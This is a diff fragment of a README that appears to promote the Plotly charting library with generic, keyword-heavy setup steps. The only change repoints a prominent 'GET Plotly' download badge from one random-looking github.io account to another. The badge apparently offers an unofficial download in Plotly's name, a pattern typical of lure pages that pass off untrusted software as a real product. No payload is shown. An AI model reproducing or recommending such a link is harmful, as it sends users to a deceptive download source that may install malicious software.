@@ -54,7 +54,7 @@ As a plotly library for modern analytics, it fits into many common data stacks. 
 
 Prerequisites: A working Python or JavaScript environment, sample data, and access to plotly documentation for installation and chart reference.
 
-[![GET Plotly](https://img.shields.io/badge/GET%20%E2%80%94%20Plotly-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/plotly-app)
+[![GET Plotly](https://img.shields.io/badge/GET%20%E2%80%94%20Plotly-0078D6?style=for-the-badge&logoColor=white)](https://teddyrosariojgih.github.io/.github/plotly-app)
 
 1.  **Install the Package:** Use plotly install guidance for Python or JavaScript so your environment can create figures, render notebooks, and export interactive charts.
 2.  **Create a First Figure:** Try plotly python with a small dataset, then compare plotly express and plotly graph objects to understand the difference between quick charts and detailed control.
